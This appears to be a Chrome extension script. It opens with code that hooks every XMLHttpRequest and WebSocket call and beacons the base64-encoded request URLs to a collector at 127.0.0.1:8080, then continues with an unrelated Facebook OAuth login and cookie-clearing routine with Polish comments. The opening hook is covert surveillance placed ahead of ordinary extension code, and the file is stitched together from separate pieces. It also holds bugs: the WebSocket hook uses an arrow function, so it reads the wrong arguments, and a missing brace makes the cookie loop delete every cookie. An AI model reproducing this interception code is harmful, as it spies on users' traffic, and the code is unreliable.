function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
/****************************************

Zastosowane obejście, otwieramy tab z URL do logowania facebook'a, następnie po udanym logowaniu szukamy w tabach
strony wynikowej tj. login_success.html - następnie logujemy sie do CNI i usuwamy TABA :).

******************************************/

var redirectUri = encodeURIComponent('https://www.facebook.com/connect/login_success.html');

var successURL = ['web.facebook.com/connect/login_success.html', 'www.facebook.com/connect/login_success.html'];

function onFacebookLogin() {

    function verifySuccessURL(tabUrl){
        for (var i=0; i<successURL.length; i++) {
            if (tabUrl.indexOf(successURL[i]) !== -1) {
                return true;
            }
        }
        return false;
    }


    chrome.tabs.query({}, function(tabs) {
      for (var i = 0; i < tabs.length; i++) {
        if (verifySuccessURL(tabs[i].url)) {
          var callbackUri = tabs[i].url;
          var tabId = tabs[i].id;
          var accessToken = urlParamFacebook('access_token', callbackUri);

          cniApiClient.loginViaFacebook(accessToken, function(authData) {
              localStorageClient.setAuthMethod('FACEBOOK');
              localStorageClient.setCachedAccessToken(accessToken);
              localStorageClient.setUserId(authData.user_id);
              pageManager.createPage(pageManager.PageName.SETTINGS);
              postLogin();
          }, function(errors) {
              logoutViaFacebook(accessToken);
          });
          chrome.tabs.remove(tabId);
        }
      }
    });
}

chrome.tabs.onUpdated.addListener(onFacebookLogin);


function signInWithFacebook() {
    var url = 'https://www.facebook.com/dialog/oauth?' +
                       'response_type=' + 'token' +
                   '&client_id=' + '1453520031636185' +
                  '&redirect_uri=' + redirectUri +
                  '&scope=' + 'email';
    chrome.tabs.create({
        url: url
    });
}

function logoutViaFacebook(accessToken, onSuccess) {
    var facebookUrlApi = 'https://graph.facebook.com';

    $.ajax({
        type: "GET",
        url: facebookUrlApi + '/me?access_token=' + accessToken,
        dataType: "json",
        success: function(user) {
            $.ajax({
                type: "DELETE",
                url: 'https://graph.facebook.com/' + user.id +'/permissions?access_token=' + accessToken,
                success: function(data) {
                    clear_cookies_associated_to_domain(extract_domain('https://www.facebook.com/'));
                    localStorageClient.clearAuthData();
                    if (onSuccess != undefined) {
                        onSuccess();
                    }
                },
                error: function(errors) {
                    console.log(errors);
                }
            });
        },
        error: function(errors) {
            if (errors.status == 400) {
               clear_cookies_associated_to_domain(extract_domain('https://www.facebook.com/'));
               localStorageClient.clearAuthData();
            }
        }
    });
}

/**
    Odnaleziono w dodatku do chroma ktory czysci cookies po zamknieciu TABA
**/

function clear_cookies_associated_to_domain (domain) {
	return chrome.cookies.getAllCookieStores(function (cookieStores) {
		for (j in cookieStores)
			chrome.cookies.getAll({"storeId":cookieStores[j].id}, function (cookies) {
				for (i in cookies) {
					var cookie_domain	= extract_second_level_domain(cookies[i].domain);
					if (cookie_domain == domain)
		                console.log(cookie_domain+'=='+domain);
						chrome.cookies.remove({"name":cookies[i].name, "url":extract_cookie_url(cookies[i]), "storeId":cookieStores[j].id});
				}
			});
	});
}

function extract_second_level_domain (domain) {
	if (domain == null) return null;

	var match = domain.match(/([^\.]+\.[^\.]{2,3}\.[^\.]{2,4}|[^\.]+\.[^\.]+)$/);
	return (match != null ? match[1] : domain);
}

function extract_hostname_from_url (url) {
	var match = url.match(/:\/\/([^\/:]+)/);
	return (match != null ? match[1] : null);
}


function extract_cookie_url (cookie) {
	return "http" + (cookie.secure ? "s" : "") + "://" + cookie.domain + cookie.path;
}

function extract_domain (url) {
	var hostname	= extract_hostname_from_url(url);
	var domain		= extract_second_level_domain(hostname);

	return domain;
}

function urlParamFacebook(name, url) {
	var results = new RegExp('[#&]' + name + '=([^&#]*)').exec(url);
	return results.length > 0 ? results[1] || 0 : 0;
}